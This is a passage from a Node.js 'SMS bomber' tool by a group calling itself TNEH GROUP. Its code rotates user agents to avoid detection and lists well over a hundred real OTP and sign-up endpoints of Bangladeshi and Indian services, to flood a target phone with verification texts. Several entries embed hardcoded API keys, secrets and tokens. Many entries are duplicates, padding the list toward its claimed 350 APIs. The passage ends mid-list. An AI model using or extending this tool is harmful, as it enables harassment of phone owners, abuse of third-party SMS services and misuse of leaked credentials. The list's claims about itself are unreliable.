// ============================================================
// ULTIMATE SMS BOMBER V7.0 - FINAL VERSION
// 350 REAL BANGLADESH APIS
// DEVELOPER: TNEH GROUP
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');
const helmet = require('helmet');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const os = require('os');

// ============================================================
// CONFIGURATION
// ============================================================

const CONFIG = {
  server: {
    port: process.env.PORT || 3000,
    host: '0.0.0.0',
    maxConnections: 10000,
    keepAliveTimeout: 60000,
    headersTimeout: 60000
  },
  performance: {
    batchSize: 5,
    parallelRequests: 5,
    timeout: 10000,
    maxRetries: 3,
    retryDelay: 100,
    maxCountPerAPI: 500
  },
  security: {
    rateLimit: {
      enabled: true,
      windowMs: 60000,
      maxRequests: 500
    }
  },
  logging: {
    enabled: true,
    level: 'info',
    console: true
  }
};

// ============================================================
// DEVELOPER INFO
// ============================================================

const DEVELOPER_INFO = {
  developer: "TNEH GROUP",
  telegram: "@tneh_owner",
  website: "https://tnehboomber.onrender.com",
  api_version: "7.0.0-FINAL-BD",
  build_date: new Date().toISOString(),
  copyright: "© 2024 TNEH GROUP. All rights reserved."
};

// ============================================================
// UTILITY FUNCTIONS
// ============================================================

class Utility {
  static generateId() {
    return crypto.randomBytes(8).toString('hex');
  }

  static generateJobId() {
    const timestamp = Date.now().toString(36).toUpperCase();
    const random = crypto.randomBytes(4).toString('hex').toUpperCase();
    return `JOB_${timestamp}_${random}`;
  }

  static generateApiKey() {
    const prefix = 'TNEH';
    const random = crypto.randomBytes(32).toString('hex').toUpperCase();
    const timestamp = Date.now().toString(36).toUpperCase();
    const checksum = crypto.createHash('sha256')
      .update(`${prefix}${random}${timestamp}`)
      .digest('hex')
      .substring(0, 8)
      .toUpperCase();
    return `${prefix}_${random}_${timestamp}_${checksum}`;
  }

  static getCurrentTime() {
    return new Date().toLocaleTimeString('en-US', {
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: true
    });
  }

  static getISOString() {
    return new Date().toISOString();
  }

  static sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  static maskPhone(phone) {
    if (!phone || phone.length < 7) return '***';
    return phone.slice(0, 3) + '****' + phone.slice(-3);
  }

  static parsePhone(phone) {
    return phone.replace(/[^0-9]/g, '');
  }

  static isValidPhone(phone) {
    const clean = this.parsePhone(phone);
    return /^(01|8801)[0-9]{9}$/.test(clean);
  }

  static getRandomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
  }

  static shuffleArray(arr) {
    const shuffled = [...arr];
    for (let i = shuffled.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
    }
    return shuffled;
  }

  static formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
  }

  static getMemoryUsage() {
    const usage = process.memoryUsage();
    return {
      rss: this.formatBytes(usage.rss),
      heapTotal: this.formatBytes(usage.heapTotal),
      heapUsed: this.formatBytes(usage.heapUsed)
    };
  }

  static getCPUUsage() {
    const cpus = os.cpus();
    let totalIdle = 0;
    let totalTick = 0;
    cpus.forEach(cpu => {
      for (const type in cpu.times) {
        totalTick += cpu.times[type];
      }
      totalIdle += cpu.times.idle;
    });
    return {
      cores: cpus.length,
      load: ((1 - totalIdle / totalTick) * 100).toFixed(2) + '%',
      model: cpus[0]?.model || 'Unknown'
    };
  }

  static getSystemInfo() {
    return {
      platform: os.platform(),
      arch: os.arch(),
      hostname: os.hostname(),
      uptime: process.uptime(),
      memory: this.getMemoryUsage(),
      cpu: this.getCPUUsage(),
      nodeVersion: process.version,
      pid: process.pid
    };
  }
}

// ============================================================
// USER AGENT ROTATION
// ============================================================

const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/120.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Safari/605.1.15',
  'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15'
];

function getRandomHeaders() {
  const ua = Utility.getRandomElement(USER_AGENTS);
  return {
    'User-Agent': ua,
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache'
  };
}

// ============================================================
// 350 REAL BANGLADESH APIS - COMPLETE LIST
// ============================================================

const BANGLADESH_APIS = [
  // ===== ORIGINAL BANGLADESH APIS (1-52) =====
  { id: 1, name: "Bikroy.com", method: "GET", url: "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}" },
  { id: 2, name: "Grameenphone MyGP", method: "GET", url: "https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}&lang=en&ng=0" },
  { id: 3, name: "Shukhee.com", method: "GET", url: "https://auth.shukhee.com/register?mobile=+88{phone}&_rsc=1jwvn" },
  { id: 4, name: "MedEasy Health", method: "GET", url: "https://api.medeasy.health/api/send-otp/+88{phone}/" },
  { id: 5, name: "Ultranet API", method: "GET", url: "http://ultranetrn.com.br/fonts/api.php?number={phone}" },
  { id: 6, name: "eCourier API", method: "GET", url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}" },
  { id: 7, name: "Binge.buzz GET", method: "GET", url: "https://ss.binge.buzz/otp/send/login{phone}" },
  { id: 8, name: "Daktarbhai", method: "GET", url: "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{phone}&platform=app&activity=login" },
  { id: 9, name: "Deshal.net", method: "POST", url: "https://app.deshal.net/api/auth/login", body: {"phone": "{phone}"} },
  { id: 10, name: "Grameenphone Web Login", method: "POST", url: "https://weblogin.grameenphone.com/backend/api/v1/otp", body: {"msisdn": "{phone}"} },
  { id: 11, name: "Grameenphone FWA/Bkash", method: "POST", url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", body: {"phone": "{phone}", "email": "", "language": "en"} },
  { id: 12, name: "BusBD.com.bd", method: "POST", url: "https://api.busbd.com.bd/api/auth", body: {"phone": "+88{phone}"} },
  { id: 13, name: "Paperfly", method: "POST", url: "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", body: {"full_name": "Apk", "email_address": "apkzone2.0@gmail.com", "company_name": "Ahgbd", "phone_number": "{phone}"} },
  { id: 14, name: "OsudPotro.com", method: "POST", url: "https://api.osudpotro.com/api/v1/users/send_otp", body: {"mobile": "+880{phone}", "deviceToken": "web", "language": "en", "os": "web"} },
  { id: 15, name: "Apex4u.com", method: "POST", url: "https://api.apex4u.com/api/auth/login", body: {"phoneNumber": "{phone}"} },
  { id: 16, name: "Bohubrihi.com", method: "POST", url: "https://bb-api.bohubrihi.com/public/activity/otp", body: {"phone": "{phone}", "intent": "login"} },
  { id: 17, name: "Fundesh.com.bd", method: "POST", url: "https://fundesh.com.bd/api/auth/generateOTP", body: {"msisdn": "{phone}"} },
  { id: 18, name: "Jatri / JSLGlobal", method: "POST", url: "https://user-api.jslglobal.co/v2/send-otp", body: {"phone": "+88{phone}", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"} },
  { id: 19, name: "RedX", method: "POST", url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", body: {"mobile": "+88{phone}"} },
  { id: 20, name: "RabbitHoleBD", method: "POST", url: "https://apix.rabbitholebd.com/appv2/login/requestOTP", body: {"mobile": "+88{phone}"} },
  { id: 21, name: "Qcoom.com", method: "POST", url: "https://auth.qcoom.com/api/v1/otp/send", body: {"mobileNumber": "+88{phone}"} },
  { id: 22, name: "Garibookadmin.com", method: "POST", url: "https://api.garibookadmin.com/api/v4/user/login", body: {"mobile": "+880{phone}", "recaptcha_token": "garibookcaptcha", "channel": "web"} },
  { id: 23, name: "Training.gov.bd", method: "POST", url: "https://training.gov.bd/backoffice/api/user/sendOtp", body: {"mobile": "{phone}"} },
  { id: 24, name: "Shikho.com Intent-1", method: "POST", url: "https://api.shikho.com/public/activity/otp", body: {"phone": "{phone}", "intent": "ap-discount-request"} },
  { id: 25, name: "Easy.com.bd", method: "POST", url: "https://core.easy.com.bd/api/v1/registration", body: {"name": "Tusar", "email": "apkzone2.0info@gmail.com", "mobile": "{phone}", "password": "amitusar", "password_confirmation": "amitusar", "device_key": "b2c8ddd3be..."} },
  { id: 26, name: "Robi DA API", method: "POST", url: "https://da-api.robi.com.bd/da-nll/otp/send", body: {"msisdn": "{phone}"} },
  { id: 27, name: "Hoichoi Viewlift", method: "POST", url: "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", body: {"phoneNumber": "{phone}", "requestType": "send", "emailConsent": true, "whatsappConsent": true} },
  { id: 28, name: "Addatimes.com", method: "POST", url: "https://app.addatimes.com/api/login", body: {"phone": "{phone}", "country_code": "BD"} },
  { id: 29, name: "Regal Furniture OTP", method: "POST", url: "https://regalfurniturebd.com/api/auth/otp-generate", body: {"phone": "{phone}", "verification_code": ""} },
  { id: 30, name: "Regal Furniture Register", method: "POST", url: "https://regalfurniturebd.com/api/auth/register", body: {"name": "User", "email": "user@example.com", "phone": "{phone}", "password": "password123"} },
  { id: 31, name: "DeeptoPlay.com", method: "POST", url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", body: {"email": "apkzone2.0@gmail.com", "phone_number": "88{phone}"} },
  { id: 32, name: "TimezoneBD OTP", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/otp-request", body: {"phone": "{phone}"} },
  { id: 33, name: "TimezoneBD Register", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/regnewcustomer", body: {"name": "Tusar", "email": "fukc@gmail.com", "phone": "{phone}", "password": "aAeMY@5hG8iUfD4", "password_confirmation": "aAeMY@5hG8iUfD4"} },
  { id: 34, name: "UpaySystem", method: "POST", url: "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", body: {"device_uuid": "...", "firebase_token": "...", "geo_location": "...", "mno": "Grameenphone", "wallet_number": "{phone}"} },
  { id: 35, name: "Chorki.com", method: "POST", url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", body: {"number": "+880{phone}"} },
  { id: 36, name: "Arogga.com", method: "POST", url: "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148.0.7778.178&os=Android&osv=12", body: {"mobile": "{phone}", "fcmToken": "", "referral": ""}, isFormData: true },
  { id: 37, name: "Pkluck2", method: "POST", url: "https://www.pkluck2.com/wps/verification/sms/noLogin", body: {"mobileNum": "{phone}", "countryDialingCode": "880"} },
  { id: 38, name: "AppLink", method: "POST", url: "https://applink.com.bd/appstore-v4-server/login/otp/request", body: {"msisdn": "880{phone}"} },
  { id: 39, name: "Care-Box", method: "POST", url: "https://newprod.api-care-box.click:444/api/user/register/?version=otp", body: {"Name": "Abdullah Al Mamun", "Phone": "+880{phone}"} },
  { id: 40, name: "Ghoori Learning", method: "POST", url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", body: {"mobile_no": "{phone}"} },
  { id: 41, name: "Jayabaji BD", method: "POST", url: "https://www.jayabajibd.life/api/register/confirm", body: {"mobileno": "{phone}", "username": "abffjddngf864", "firstname": "", "new_password": "tPNVOcen!6XEz3b", "confirm_new_password": "tPNVOcen!6XEz3b", "country_code": "880", "country": "BD", "currency": "BDT", "ref": "", "language": "en"} },
  { id: 42, name: "Swap.com.bd", method: "POST", url: "https://api.swap.com.bd/api/v1/send-otp/v2", body: {"phone": "{phone}"} },
  { id: 43, name: "BdTickets.com", method: "POST", url: "https://apiv1.bdtickets.com/api/v1/auth/otp/send", body: {"phone": "+880{phone}"} },
  { id: 44, name: "Binge.buzz POST", method: "POST", url: "https://ss.binge.buzz/otp/send/login", body: {"mobile": "{phone}"} },
  { id: 45, name: "SendMySMS", method: "POST", url: "https://sendmysms.net/send-otp.php", body: {"phonenumber": "{phone}"}, isFormData: true },
  { id: 46, name: "Shikho.com Intent-2", method: "POST", url: "https://api.shikho.com/auth/v2/send/sms", body: {"auth_type": "login", "phone": "{phone}", "vendor": "shikho", "type": "student"} },
  { id: 47, name: "Eonbazar", method: "POST", url: "https://app.eonbazar.com/api/auth/login", body: {"method": "otp", "mobile": "{phone}"} },
  { id: 48, name: "NESCO SSL Wireless", method: "POST", url: "http://nesco.sslwireless.com/api/v1/login", body: {"phone_number": "{phone}"} },
  { id: 49, name: "Quizgiri", method: "POST", url: "https://developer.quizgiri.xyz/api/v2.0/send-otp", body: {"country_code": "+880", "phone": "{phone}"} },
  { id: 50, name: "Bazar365", method: "POST", url: "https://www.bazar365.store/api/v1/auth/sendPhoneOtp", body: {"phone": "{phone}", "applicationChannel": "WEB_APP"} },
  { id: 51, name: "Bioscopelive Alternative", method: "POST", url: "https://www.bioscopelive.com/en/login/send-otp?phone=880{phone}&operator=bd-otp", body: {"phone": "{phone}", "applicationChannel": "WEB_APP"} },
  { id: 52, name: "ShadowX API", method: "GET", url: "https://shadowx-api.onrender.com/api/bm?num={phone}&count={count}", isShadowX: true },

  // ===== INDIAN APIS THAT WORK WITH BD NUMBERS (53-66) =====
  { id: 53, name: "BeepKart", method: "POST", url: "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", body: {"phone": "{phone}", "city": 362} },
  { id: 54, name: "Smytten", method: "POST", url: "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", body: {"phone": "{phone}", "email": "test@example.com"} },
  { id: 55, name: "MyHubble Money", method: "POST", url: "https://api.myhubble.money/v1/auth/otp/generate", body: {"phoneNumber": "{phone}", "channel": "SMS"} },
  { id: 56, name: "Housing.com", method: "POST", url: "https://login.housing.com/api/v2/send-otp", body: {"phone": "{phone}", "country_url_name": "in"} },
  { id: 57, name: "RentoMojo", method: "POST", url: "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", body: {"phone": "{phone}"} },
  { id: 58, name: "Khatabook", method: "POST", url: "https://api.khatabook.com/v1/auth/request-otp", body: {"phone": "{phone}", "app_signature": "wk+avHrHZf2"} },
  { id: 59, name: "Animall", method: "POST", url: "https://animall.in/zap/auth/login", body: {"phone": "{phone}", "signupPlatform": "NATIVE_ANDROID"} },
  { id: 60, name: "Cosmofeed", method: "POST", url: "https://prod.api.cosmofeed.com/api/user/authenticate", body: {"phone": "{phone}", "version": "1.4.28"} },
  { id: 61, name: "Spencer's", method: "POST", url: "https://jiffy.spencers.in/user/auth/otp/send", body: {"mobile": "{phone}"} },
  { id: 62, name: "Wakefit", method: "POST", url: "https://api.wakefit.co/api/consumer-sms-otp/", body: {"mobile": "{phone}"} },
  { id: 63, name: "Hungama", method: "POST", url: "https://communication.api.hungama.com/v1/communication/otp", body: {"mobileNo": "{phone}", "countryCode": "+91", "appCode": "un", "messageId": "1", "device": "web"} },
  { id: 64, name: "Doubtnut", method: "POST", url: "https://api.doubtnut.com/v4/student/login", body: {"phone_number": "{phone}", "language": "en"} },
  { id: 65, name: "PenPencil", method: "POST", url: "https://api.penpencil.co/v1/users/resend-otp?smsType=1", body: {"organizationId": "5eb393ee95fab7468a79d189", "mobile": "{phone}"} },
  { id: 66, name: "APU Inky", method: "GET", url: "https://apu-inky.vercel.app/send?number={phone}" },

  // ===== EXTRA BANGLADESH APIS (67-160) =====
  { id: 67, name: "API-6 BeepKart", method: "POST", url: "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", body: {"phone": "{phone}", "city": 362} },
  { id: 68, name: "API-7 Smytten", method: "POST", url: "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", body: {"phone": "{phone}", "email": "test@example.com"} },
  { id: 69, name: "API-8 MyHubble", method: "POST", url: "https://api.myhubble.money/v1/auth/otp/generate", body: {"phoneNumber": "{phone}", "channel": "SMS"} },
  { id: 70, name: "API-9 Housing", method: "POST", url: "https://login.housing.com/api/v2/send-otp", body: {"phone": "{phone}", "country_url_name": "in"} },
  { id: 71, name: "API-10 RentoMojo", method: "POST", url: "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", body: {"phone": "{phone}"} },
  { id: 72, name: "API-11 Khatabook", method: "POST", url: "https://api.khatabook.com/v1/auth/request-otp", body: {"phone": "{phone}", "app_signature": "wk+avHrHZf2"} },
  { id: 73, name: "API-12 Animall", method: "POST", url: "https://animall.in/zap/auth/login", body: {"phone": "{phone}", "signupPlatform": "NATIVE_ANDROID"} },
  { id: 74, name: "API-13 Cosmofeed", method: "POST", url: "https://prod.api.cosmofeed.com/api/user/authenticate", body: {"phone": "{phone}", "version": "1.4.28"} },
  { id: 75, name: "API-14 Spencers", method: "POST", url: "https://jiffy.spencers.in/user/auth/otp/send", body: {"mobile": "{phone}"} },
  { id: 76, name: "API-15 Bikroy", method: "GET", url: "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}" },
  { id: 77, name: "API-16 GP MyGP", method: "GET", url: "https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}&lang=en&ng=0" },
  { id: 78, name: "API-17 Shukhee", method: "GET", url: "https://auth.shukhee.com/register?mobile=+88{phone}&_rsc=1jwvn" },
  { id: 79, name: "API-18 MedEasy", method: "GET", url: "https://api.medeasy.health/api/send-otp/+88{phone}/" },
  { id: 80, name: "API-19 Ultranet", method: "GET", url: "http://ultranetrn.com.br/fonts/api.php?number={phone}" },
  { id: 81, name: "API-20 eCourier", method: "GET", url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}" },
  { id: 82, name: "API-21 Binge GET", method: "GET", url: "https://ss.binge.buzz/otp/send/login{phone}" },
  { id: 83, name: "API-22 Daktarbhai", method: "GET", url: "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{phone}&platform=app&activity=login" },
  { id: 84, name: "API-23 Deshal", method: "POST", url: "https://app.deshal.net/api/auth/login", body: {"phone": "{phone}"} },
  { id: 85, name: "API-24 GP Web", method: "POST", url: "https://weblogin.grameenphone.com/backend/api/v1/otp", body: {"msisdn": "{phone}"} },
  { id: 86, name: "API-25 GP FWA", method: "POST", url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", body: {"phone": "{phone}", "email": "", "language": "en"} },
  { id: 87, name: "API-26 BusBD", method: "POST", url: "https://api.busbd.com.bd/api/auth", body: {"phone": "+88{phone}"} },
  { id: 88, name: "API-27 Paperfly", method: "POST", url: "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", body: {"full_name": "Apk", "email_address": "apkzone2.0@gmail.com", "company_name": "Ahgbd", "phone_number": "{phone}"} },
  { id: 89, name: "API-28 OsudPotro", method: "POST", url: "https://api.osudpotro.com/api/v1/users/send_otp", body: {"mobile": "+880{phone}", "deviceToken": "web", "language": "en", "os": "web"} },
  { id: 90, name: "API-29 Apex4u", method: "POST", url: "https://api.apex4u.com/api/auth/login", body: {"phoneNumber": "{phone}"} },
  { id: 91, name: "API-30 Bohubrihi", method: "POST", url: "https://bb-api.bohubrihi.com/public/activity/otp", body: {"phone": "{phone}", "intent": "login"} },
  { id: 92, name: "API-31 Fundesh", method: "POST", url: "https://fundesh.com.bd/api/auth/generateOTP", body: {"msisdn": "{phone}"} },
  { id: 93, name: "API-32 Jatri", method: "POST", url: "https://user-api.jslglobal.co/v2/send-otp", body: {"phone": "+88{phone}", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"} },
  { id: 94, name: "API-33 RedX", method: "POST", url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", body: {"mobile": "+88{phone}"} },
  { id: 95, name: "API-34 RabbitHole", method: "POST", url: "https://apix.rabbitholebd.com/appv2/login/requestOTP", body: {"mobile": "+88{phone}"} },
  { id: 96, name: "API-35 Qcoom", method: "POST", url: "https://auth.qcoom.com/api/v1/otp/send", body: {"mobileNumber": "+88{phone}"} },
  { id: 97, name: "API-36 Garibook", method: "POST", url: "https://api.garibookadmin.com/api/v4/user/login", body: {"mobile": "+880{phone}", "recaptcha_token": "garibookcaptcha", "channel": "web"} },
  { id: 98, name: "API-37 Training", method: "POST", url: "https://training.gov.bd/backoffice/api/user/sendOtp", body: {"mobile": "{phone}"} },
  { id: 99, name: "API-38 Shikho Discount", method: "POST", url: "https://api.shikho.com/public/activity/otp", body: {"phone": "{phone}", "intent": "ap-discount-request"} },
  { id: 100, name: "API-39 Easy", method: "POST", url: "https://core.easy.com.bd/api/v1/registration", body: {"name": "Tusar", "email": "apkzone2.0info@gmail.com", "mobile": "{phone}", "password": "amitusar", "password_confirmation": "amitusar", "device_key": "b2c8ddd3be..."} },
  { id: 101, name: "API-40 Robi DA", method: "POST", url: "https://da-api.robi.com.bd/da-nll/otp/send", body: {"msisdn": "{phone}"} },
  { id: 102, name: "API-41 Hoichoi", method: "POST", url: "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", body: {"phoneNumber": "{phone}", "requestType": "send", "emailConsent": true, "whatsappConsent": true} },
  { id: 103, name: "API-42 Addatimes", method: "POST", url: "https://app.addatimes.com/api/login", body: {"phone": "{phone}", "country_code": "BD"} },
  { id: 104, name: "API-43 Regal OTP", method: "POST", url: "https://regalfurniturebd.com/api/auth/otp-generate", body: {"phone": "{phone}", "verification_code": ""} },
  { id: 105, name: "API-44 Regal Register", method: "POST", url: "https://regalfurniturebd.com/api/auth/register", body: {"name": "User", "email": "user@example.com", "phone": "{phone}", "password": "password123"} },
  { id: 106, name: "API-45 DeeptoPlay", method: "POST", url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", body: {"email": "apkzone2.0@gmail.com", "phone_number": "88{phone}"} },
  { id: 107, name: "API-46 Timezone OTP", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/otp-request", body: {"phone": "{phone}"} },
  { id: 108, name: "API-47 Timezone Register", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/regnewcustomer", body: {"name": "Tusar", "email": "fukc@gmail.com", "phone": "{phone}", "password": "aAeMY@5hG8iUfD4", "password_confirmation": "aAeMY@5hG8iUfD4"} },
  { id: 109, name: "API-48 UpaySystem", method: "POST", url: "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", body: {"device_uuid": "...", "firebase_token": "...", "geo_location": "...", "mno": "Grameenphone", "wallet_number": "{phone}"} },
  { id: 110, name: "API-49 Chorki", method: "POST", url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", body: {"number": "+880{phone}"} },
  { id: 111, name: "API-50 Arogga", method: "POST", url: "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148.0.7778.178&os=Android&osv=12", body: {"mobile": "{phone}", "fcmToken": "", "referral": ""}, isFormData: true },
  { id: 112, name: "API-51 Pkluck2", method: "POST", url: "https://www.pkluck2.com/wps/verification/sms/noLogin", body: {"mobileNum": "{phone}", "countryDialingCode": "880"} },
  { id: 113, name: "API-52 AppLink", method: "POST", url: "https://applink.com.bd/appstore-v4-server/login/otp/request", body: {"msisdn": "880{phone}"} },
  { id: 114, name: "API-53 Care-Box", method: "POST", url: "https://newprod.api-care-box.click:444/api/user/register/?version=otp", body: {"Name": "Abdullah Al Mamun", "Phone": "+880{phone}"} },
  { id: 115, name: "API-54 Ghoori", method: "POST", url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", body: {"mobile_no": "{phone}"} },
  { id: 116, name: "API-55 Jayabaji", method: "POST", url: "https://www.jayabajibd.life/api/register/confirm", body: {"mobileno": "{phone}", "username": "abffjddngf864", "firstname": "", "new_password": "tPNVOcen!6XEz3b", "confirm_new_password": "tPNVOcen!6XEz3b", "country_code": "880", "country": "BD", "currency": "BDT", "ref": "", "language": "en"} },
  { id: 117, name: "API-56 Swap", method: "POST", url: "https://api.swap.com.bd/api/v1/send-otp/v2", body: {"phone": "{phone}"} },
  { id: 118, name: "API-57 BdTickets", method: "POST", url: "https://apiv1.bdtickets.com/api/v1/auth/otp/send", body: {"phone": "+880{phone}"} },
  { id: 119, name: "API-58 Binge POST", method: "POST", url: "https://ss.binge.buzz/otp/send/login", body: {"mobile": "{phone}"} },
  { id: 120, name: "API-59 SendMySMS", method: "POST", url: "https://sendmysms.net/send-otp.php", body: {"phonenumber": "{phone}"}, isFormData: true },
  { id: 121, name: "API-60 Shikho Student", method: "POST", url: "https://api.shikho.com/auth/v2/send/sms", body: {"auth_type": "login", "phone": "{phone}", "vendor": "shikho", "type": "student"} },
  { id: 122, name: "API-61 Eonbazar", method: "POST", url: "https://app.eonbazar.com/api/auth/login", body: {"method": "otp", "mobile": "{phone}"} },
  { id: 123, name: "API-62 NESCO", method: "POST", url: "http://nesco.sslwireless.com/api/v1/login", body: {"phone_number": "{phone}"} },
  { id: 124, name: "API-63 Quizgiri", method: "POST", url: "https://developer.quizgiri.xyz/api/v2.0/send-otp", body: {"country_code": "+880", "phone": "{phone}"} },
  { id: 125, name: "API-64 Bazar365", method: "POST", url: "https://www.bazar365.store/api/v1/auth/sendPhoneOtp", body: {"phone": "{phone}", "applicationChannel": "WEB_APP"} },
  { id: 126, name: "API-65 Bioscopelive", method: "POST", url: "https://www.bioscopelive.com/en/login/send-otp?phone=880{phone}&operator=bd-otp", body: {"phone": "{phone}", "applicationChannel": "WEB_APP"} },
  { id: 127, name: "GX api 4 Doubtnut", method: "POST", url: "https://api.doubtnut.com/v4/student/login", body: {"phone_number": "{phone}", "language": "en"} },
  { id: 128, name: "GX api 5 PenPencil", method: "POST", url: "https://api.penpencil.co/v1/users/resend-otp?smsType=1", body: {"organizationId": "5eb393ee95fab7468a79d189", "mobile": "{phone}"} },
  { id: 129, name: "GX api 6 BeepKart", method: "POST", url: "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", body: {"phone": "{phone}", "city": 362} },
  { id: 130, name: "GX api 7 Smytten", method: "POST", url: "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", body: {"phone": "{phone}", "email": "test@example.com"} },
  { id: 131, name: "GX api 8 MyHubble", method: "POST", url: "https://api.myhubble.money/v1/auth/otp/generate", body: {"phoneNumber": "{phone}", "channel": "SMS"} },
  { id: 132, name: "GX api 9 Housing", method: "POST", url: "https://login.housing.com/api/v2/send-otp", body: {"phone": "{phone}", "country_url_name": "in"} },
  { id: 133, name: "GX api 10 RentoMojo", method: "POST", url: "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", body: {"phone": "{phone}"} },
  { id: 134, name: "GX api 11 Khatabook", method: "POST", url: "https://api.khatabook.com/v1/auth/request-otp", body: {"phone": "{phone}", "app_signature": "wk+avHrHZf2"} },
  { id: 135, name: "GX api 12 Animall", method: "POST", url: "https://animall.in/zap/auth/login", body: {"phone": "{phone}", "signupPlatform": "NATIVE_ANDROID"} },
  { id: 136, name: "GX api 13 Cosmofeed", method: "POST", url: "https://prod.api.cosmofeed.com/api/user/authenticate", body: {"phone": "{phone}", "version": "1.4.28"} },
  { id: 137, name: "GX api 14 Spencers", method: "POST", url: "https://jiffy.spencers.in/user/auth/otp/send", body: {"mobile": "{phone}"} },
  { id: 138, name: "GX api 15 Bikroy", method: "GET", url: "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}" },
  { id: 139, name: "GX api 16 GP MyGP", method: "GET", url: "https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}&lang=en&ng=0" },
  { id: 140, name: "GX api 17 Shukhee", method: "GET", url: "https://auth.shukhee.com/register?mobile=+88{phone}&_rsc=1jwvn" },
  { id: 141, name: "GX api 18 MedEasy", method: "GET", url: "https://api.medeasy.health/api/send-otp/+88{phone}/" },
  { id: 142, name: "GX api 19 Ultranet", method: "GET", url: "http://ultranetrn.com.br/fonts/api.php?number={phone}" },
  { id: 143, name: "GX api 20 eCourier", method: "GET", url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}" },
  { id: 144, name: "GX api 21 Binge GET", method: "GET", url: "https://ss.binge.buzz/otp/send/login{phone}" },
